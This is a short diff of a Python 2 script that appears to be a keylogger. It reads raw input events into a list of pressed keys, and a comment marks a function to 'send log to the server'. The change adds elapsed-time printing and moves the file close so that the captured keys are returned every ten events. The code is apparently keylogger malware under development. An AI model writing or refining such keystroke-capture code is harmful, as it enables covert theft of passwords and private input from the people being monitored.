@@ -40,6 +40,8 @@ def run(**args):
 	event = in_file.read(EVENT_SIZE)
 	x = 1
 	pressedKey = []
+	start = time.clock()
+	
 	verbose = False
 	if len(sys.argv) > 2:
 		if sys.argv[2] == '-v' or sys.argv[2] == '--verbose':
@@ -77,9 +79,12 @@ def run(**args):
 		x += 1
 		event = in_file.read(EVENT_SIZE)
 		if(x%10 == 0):
+			stop = time.clock()
+			print stop-start
+			in_file.close()
 			return str(pressedKey)
 
-	in_file.close()
+	
 	
 # send log to the server function
 #================= main Programs starts here ======================
